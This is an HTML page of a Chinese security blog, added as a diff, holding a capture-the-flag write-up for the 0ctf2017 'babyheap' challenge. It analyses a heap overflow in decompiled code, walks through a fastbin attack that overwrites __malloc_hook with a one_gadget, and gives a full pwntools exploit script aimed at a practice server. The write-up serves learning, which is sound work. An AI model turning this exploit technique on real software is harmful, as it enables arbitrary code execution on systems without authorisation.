@@ -1,0 +1,1149 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon00.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="这题也算折磨我挺久了，看着师傅们一个个都做出来了，我却一点思路都么得，属实有点慌">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0ctf2017 babyheap">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;16&#x2F;0ctf2017-babyheap&#x2F;index.html">
+<meta property="og:site_name" content="N0vice&#39;s Blog">
+<meta property="og:description" content="这题也算折磨我挺久了，看着师傅们一个个都做出来了，我却一点思路都么得，属实有点慌">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;16&#x2F;0ctf2017-babyheap&#x2F;babyheap1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;16&#x2F;0ctf2017-babyheap&#x2F;babyheap2.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;16&#x2F;0ctf2017-babyheap&#x2F;babyheap3.png">
+<meta property="article:published_time" content="2020-04-16T14:47:03.000Z">
+<meta property="article:modified_time" content="2020-04-16T16:16:28.393Z">
+<meta property="article:author" content="N0vice">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;16&#x2F;0ctf2017-babyheap&#x2F;babyheap1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/04/16/0ctf2017-babyheap/"/>
+
+
+
+
+
+  <title>0ctf2017 babyheap | N0vice's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.1.0"></head>
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"/>
+<script src="/live2d-widget/autoload.js"></script>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">N0vice's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/16/0ctf2017-babyheap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="N0vice">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="N0vice's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">0ctf2017 babyheap</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-16T22:47:03+08:00">
+                2020-04-16
+              </time>
+            
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>这题也算折磨我挺久了，看着师傅们一个个都做出来了，我却一点思路都么得，属实有点慌<a id="more"></a><br>这题就是个典型的fastbin attack,写这篇write-up也作为对于常用fastbin attack攻击思路的学习总结<br>首先检查保护   </p>
+<pre><code class="shell">[*] &#39;/home/N0vice/Desktop/BUUCTF/babyheap_0ctf_2017/babyheap_0ctf_2017&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled</code></pre>
+<p>所有保护都开了，got表不可写<br>分析伪代码（add等函数我已重命名）<br>标准笔记管理系统   </p>
+<pre><code class="c"><span class="function"><span class="keyword">int</span> <span class="title">sub_CF4</span><span class="params">()</span></span>
+<span class="function"></span>{
+  <span class="built_in">puts</span>(<span class="string">"1. Allocate"</span>);
+  <span class="built_in">puts</span>(<span class="string">"2. Fill"</span>);
+  <span class="built_in">puts</span>(<span class="string">"3. Free"</span>);
+  <span class="built_in">puts</span>(<span class="string">"4. Dump"</span>);
+  <span class="built_in">puts</span>(<span class="string">"5. Exit"</span>);
+  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Command: "</span>);
+}</code></pre>
+<pre><code class="C++">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span>
+<span class="function"></span>{
+  <span class="keyword">char</span> *v4; <span class="comment">// [rsp+8h] [rbp-8h]</span>
+
+  v4 = sub_B70();
+  <span class="keyword">while</span> ( <span class="number">1</span> )
+  {
+    menu();
+    get_number();
+    <span class="keyword">switch</span> ( off_14F4 )
+    {
+      <span class="keyword">case</span> <span class="number">1u</span>LL:
+        add(v4);
+        <span class="keyword">break</span>;
+      <span class="keyword">case</span> <span class="number">2u</span>LL:
+        edit(v4);
+        <span class="keyword">break</span>;
+      <span class="keyword">case</span> <span class="number">3u</span>LL:
+        <span class="keyword">delete</span>(v4);
+        <span class="keyword">break</span>;
+      <span class="keyword">case</span> <span class="number">4u</span>LL:
+        show(v4);
+        <span class="keyword">break</span>;
+      <span class="keyword">case</span> <span class="number">5u</span>LL:
+        <span class="keyword">return</span> <span class="number">0L</span>L;
+      <span class="keyword">default</span>:
+        <span class="keyword">continue</span>;
+    }
+  }
+}</code></pre>
+<pre><code class="C++"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">add</span><span class="params">(__int64 a1)</span></span>
+<span class="function"></span>{
+  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span>
+  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span>
+  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+18h] [rbp-8h]</span>
+
+  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )
+  {
+    <span class="keyword">if</span> ( !*(<span class="number">24L</span>L * i + a1) )
+    {
+      <span class="built_in">printf</span>(<span class="string">"Size: "</span>);
+      v2 = get_number();
+      <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )
+      {
+        <span class="keyword">if</span> ( v2 &gt; <span class="number">4096</span> )
+          v2 = <span class="number">4096</span>;
+        v3 = <span class="built_in">calloc</span>(v2, <span class="number">1u</span>LL);
+        <span class="keyword">if</span> ( !v3 )
+          <span class="built_in">exit</span>(<span class="number">-1</span>);
+        *(<span class="number">24L</span>L * i + a1) = <span class="number">1</span>;
+        *(a1 + <span class="number">24L</span>L * i + <span class="number">8</span>) = v2;
+        *(a1 + <span class="number">24L</span>L * i + <span class="number">16</span>) = v3;
+        <span class="built_in">printf</span>(<span class="string">"Allocate Index %d\n"</span>, i);
+      }
+      <span class="keyword">return</span>;
+    }
+  }
+}</code></pre>
+<p>使用calloc申请chunk，会将chunk中的内容全部清零  </p>
+<pre><code class="C++">__int64 __<span class="function">fastcall <span class="title">edit</span><span class="params">(__int64 a1)</span></span>
+<span class="function"></span>{
+  __int64 result; <span class="comment">// rax</span>
+  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span>
+  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span>
+
+  <span class="built_in">printf</span>(<span class="string">"Index: "</span>);
+  result = get_number();
+  v2 = result;
+  <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">15</span> )
+  {
+    result = *(<span class="number">24L</span>L * result + a1);
+    <span class="keyword">if</span> ( result == <span class="number">1</span> )
+    {
+      <span class="built_in">printf</span>(<span class="string">"Size: "</span>);
+      result = get_number();
+      v3 = result;
+      <span class="keyword">if</span> ( result &gt; <span class="number">0</span> )
+      {
+        <span class="built_in">printf</span>(<span class="string">"Content: "</span>);
+        result = sub_11B2(*(<span class="number">24L</span>L * v2 + a1 + <span class="number">16</span>), v3);
+      }
+    }
+  }
+  <span class="keyword">return</span> result;
+}</code></pre>
+<p>fill未检查size是否小于add的chunk size，可造成堆溢出  </p>
+<pre><code class="C++">__int64 __<span class="function">fastcall <span class="title">delete</span><span class="params">(__int64 a1)</span></span>
+<span class="function"></span>{
+  __int64 result; <span class="comment">// rax</span>
+  <span class="keyword">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span>
+
+  <span class="built_in">printf</span>(<span class="string">"Index: "</span>);
+  result = get_number();
+  v2 = result;
+  <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">15</span> )
+  {
+    result = *(<span class="number">24L</span>L * result + a1);
+    <span class="keyword">if</span> ( result == <span class="number">1</span> )
+    {
+      *(<span class="number">24L</span>L * v2 + a1) = <span class="number">0</span>;
+      *(<span class="number">24L</span>L * v2 + a1 + <span class="number">8</span>) = <span class="number">0L</span>L;
+      <span class="built_in">free</span>(*(<span class="number">24L</span>L * v2 + a1 + <span class="number">16</span>));
+      result = <span class="number">24L</span>L * v2 + a1;
+      *(result + <span class="number">16</span>) = <span class="number">0L</span>L;
+    }
+  }
+  <span class="keyword">return</span> result;
+}</code></pre>
+<p>指针置零，无UAF  </p>
+<pre><code class="cpp"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">fastcall <span class="title">show</span><span class="params">(__int64 a1)</span></span>
+<span class="function"></span>{
+  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span>
+  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span>
+
+  <span class="built_in">printf</span>(<span class="string">"Index: "</span>);
+  result = get_number();
+  v2 = result;
+  <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">15</span> )
+  {
+    result = *(<span class="number">24L</span>L * result + a1);
+    <span class="keyword">if</span> ( result == <span class="number">1</span> )
+    {
+      <span class="built_in">puts</span>(<span class="string">"Content: "</span>);
+      sub_130F(*(<span class="number">24L</span>L * v2 + a1 + <span class="number">16</span>), *(<span class="number">24L</span>L * v2 + a1 + <span class="number">8</span>));
+      result = <span class="built_in">puts</span>(byte_14F1);
+    }
+  }
+  <span class="keyword">return</span> result;
+}</code></pre>
+<p>show函数无漏洞  </p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>无UAF，且calloc会对内存进行清空，难以leak  </p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>利用堆溢出，leak出地址，将malloc_hook改one_gadget一把梭，gg<br>如何leak呢，我们知道需要一块被free的内存里面存在悬垂指针，然后我们打印出来，就能leak出地址<br>但是这里不存在UAF，chunk在free之后和刚calloc的时候都会被清空，那么我们要得到一块已经free，但是里面又存在地址的chunk，这时候我们就要用到这个堆溢出了，改写size，将已经free的chunk包含在没有free的chunk中，让系统以为两块chunk是同一块没有free的chunk，这样show的时候就能将已经free的chunk里的内容leak出来<br>梳理一下思路：<br>①add 4个chunk，标号0,1,2,3<br>②free chunk1，通过edit chunk0，将chunk1的size改为两倍，这样就能将chunk2包含进去<br>③add size==2*chunk1，获得了一个包含chunk2的chunk1，size变为原来的两倍<br>④通过edit chunk1，将chunk2的size恢复<br>⑤free chunk2，此时chunk2的fd指向unsorted bin的地址，同时也是main_arena+88<br>⑥打印chunk1，由于chunk1包含了已经free的chunk2，所以可以接收到main_arena+88，计算出libc_base以及malloc_hook的地址<br>⑦将free掉的chunk2 add回来，同时add两块大小为0x60的chunk，标号为4，5<br>⑧将chunk5 free掉，通过edit chunk4，溢出修改chunk5的fd位为malloc_hook-0x23<br>这个时候，bins里长这样<br><img src="babyheap1.png" alt=""><br>⑨将chunk5 add回来，再add一次0x60大小的chunk，就能获得一块首地址为malloc_hook-0x23的chunk6<br>add一次之后，bins长这样<br><img src="babyheap2.png" alt=""><br>add两次之后长这样<br><img src="babyheap3.png" alt=""><br>但是现在在heap里看不到最后一个chunk6，因为不相邻<br>⑩edit chunk6，因为首地址是malloc_hook-0x23，减去chunk头，距离malloc_hook还有0x13，填充0x13个a，就能改写malloc_hook指向的值，将其改为one_gadget<br>⑪随便add一下，调用calloc函数，就能调用malloc_hook，getshell  </p>
+<h2 id="为什么？"><a href="#为什么？" class="headerlink" title="为什么？"></a>为什么？</h2><p>问:为什么要将chunk2的size恢复？<br>答:fastbin有检查，chunk_size必须与相应的fastbin_index匹配<br>问:为什么是0x60大小的chunk？为什么是malloc_hook-0x23？<br>答:我不知道，记住就vans啦  </p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code class="python"><span class="comment">#!/usr/bin/env python</span>
+<span class="comment">#coding=utf-8</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span>*
+<span class="keyword">import</span> sys
+<span class="comment">#context.log_level = 'debug'</span>
+context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
+binary = <span class="string">'./babyheap_0ctf_2017'</span> 
+local = <span class="number">1</span>
+<span class="keyword">if</span> local == <span class="number">1</span>:
+    p=process(binary)
+<span class="keyword">else</span>:
+    p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28999</span>)
+elf=ELF(binary)
+libc=elf.libc
+<span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span>
+    p.recvuntil(<span class="string">"Command: "</span>)
+    p.sendline(<span class="string">"1"</span>)
+    p.recvuntil(<span class="string">"Size: "</span>)
+    p.sendline(str(size))
+<span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span>
+    p.recvuntil(<span class="string">"Command: "</span>)
+    p.sendline(<span class="string">"2"</span>)
+    p.recvuntil(<span class="string">"Index: "</span>)
+    p.sendline(str(index))
+    p.recvuntil(<span class="string">"Size: "</span>)
+    p.sendline(str(size))
+    p.recvuntil(<span class="string">"Content: "</span>)
+    p.sendline(str(content))
+<span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span>
+    p.recvuntil(<span class="string">"Command: "</span>)
+    p.sendline(<span class="string">"3"</span>)
+    p.recvuntil(<span class="string">"Index: "</span>)
+    p.sendline(str(index))
+<span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span>
+    p.recvuntil(<span class="string">"Command: "</span>)
+    p.sendline(<span class="string">"4"</span>)
+    p.recvuntil(<span class="string">"Index: "</span>)
+    p.sendline(str(index))
+
+<span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span>
+    add(<span class="number">0x90</span>) <span class="comment"># 0</span>
+    add(<span class="number">0x90</span>) <span class="comment"># 1</span>
+    add(<span class="number">0x90</span>) <span class="comment"># 2</span>
+    add(<span class="number">0x90</span>) <span class="comment"># 3</span>
+    delete(<span class="number">1</span>)
+    payload = <span class="string">"a"</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x141</span>)
+    edit(<span class="number">0</span>,len(payload),payload)
+    add(<span class="number">0x130</span>) <span class="comment"># 1</span>
+    payload = <span class="string">"a"</span>*<span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>)
+    edit(<span class="number">1</span>,len(payload),payload)
+    delete(<span class="number">2</span>)
+    show(<span class="number">1</span>)
+    <span class="comment">#gdb.attach(p)</span>
+    p.recv(<span class="number">0xa0</span>)
+    libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span>
+    log.success(<span class="string">"libc_base==&gt;"</span> + hex(libc_base))
+    malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]
+    add(<span class="number">0x90</span>) <span class="comment"># 2</span>
+    add(<span class="number">0x60</span>) <span class="comment"># 4</span>
+    add(<span class="number">0x60</span>) <span class="comment"># 5</span>
+    delete(<span class="number">5</span>)
+    payload = <span class="string">"a"</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(malloc_hook<span class="number">-0x23</span>)
+    edit(<span class="number">4</span>,len(payload),payload)
+    add(<span class="number">0x60</span>) <span class="comment"># 5</span>
+    add(<span class="number">0x60</span>) <span class="comment"># 6</span>
+    <span class="comment">#gdb.attach(p)</span>
+    one_gadget = libc_base + <span class="number">0x4526a</span>
+    payload = <span class="string">"a"</span>*<span class="number">0x13</span> + p64(one_gadget)
+    edit(<span class="number">6</span>,len(payload),payload)
+    add(<span class="number">0x10</span>)
+    p.interactive()
+exp()</code></pre>
+<p>这个手法虽然看了很多文章，包括这个题wp也看了有很多篇，但是还是有点模模糊糊，不是很明白<br>如果有什么说错了的地方，希望师傅们能纠正<br>参考链接：<br><a href="https://xz.aliyun.com/t/7490" target="_blank" rel="noopener">https://xz.aliyun.com/t/7490</a><br><a href="https://thriumph.top/babyheap-0ctf-2017-fastbin-attack.html" target="_blank" rel="noopener">https://thriumph.top/babyheap-0ctf-2017-fastbin-attack.html</a><br><a href="https://aryb1n.github.io/2018/07/06/0ctf2017-babyheap/" target="_blank" rel="noopener">https://aryb1n.github.io/2018/07/06/0ctf2017-babyheap/</a><br><a href="https://bbs.pediy.com/thread-246786.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-246786.htm</a><br><a href="https://www.dazhuanlan.com/2019/10/16/5da734c818cb3/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2019/10/16/5da734c818cb3/</a>  </p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的鼓励将支持我继续努力！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="N0vice 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="N0vice 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    N0vice
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2020/04/16/0ctf2017-babyheap/" title="0ctf2017 babyheap">http://yoursite.com/2020/04/16/0ctf2017-babyheap/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/09/Stack-smash/" rel="next" title="Stack smash">
+                <i class="fa fa-chevron-left"></i> Stack smash
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/04/19/roarctf-2019-easypwn/" rel="prev" title="roarctf 2019 easypwn">
+                roarctf 2019 easypwn <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="N0vice" />
+            
+              <p class="site-author-name" itemprop="name">N0vice</p>
+              <p class="site-description motion-element" itemprop="description">从前我是瞎的，如今我看得见</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/N0vice21" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.zhihu.com/people/luo-yu-piao" target="_blank" title="知乎">
+                      
+                        <i class="fa fa-fw fa-zhihu"></i>知乎</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://spacey.top/" title="Elli0t" target="_blank">Elli0t</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.ericdshen.com/" title="EDS" target="_blank">EDS</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://migraine-sudo.github.io" title="Migraine" target="_blank">Migraine</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://shawroot.cc/" title="Root" target="_blank">Root</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.yuque.com/pi3ntn/azmee3" title="Lime" target="_blank">Lime</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://mrbelieve128.github.io/" title="Mr.Believe" target="_blank">Mr.Believe</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://l0x1c.github.io/" title="L0x1c" target="_blank">L0x1c</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://binlep.top/" title="binlep" target="_blank">binlep</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://1p0ch.cn/" title="1p0ch" target="_blank">1p0ch</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://retr0.vip/" title="Retr_0" target="_blank">Retr_0</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.pwn4fun.com/" title="Railgun" target="_blank">Railgun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hackerpoet.com/" title="T4rn" target="_blank">T4rn</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.csdn.net/SopRomeo" title="penson" target="_blank">penson</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/lemon629/" title="lemon" target="_blank">lemon</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://surager.pub/" title="5ur4g3r" target="_blank">5ur4g3r</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.snowywar.top/" title="snowywar" target="_blank">snowywar</a>
+                  </li>
+                
+              </ul>
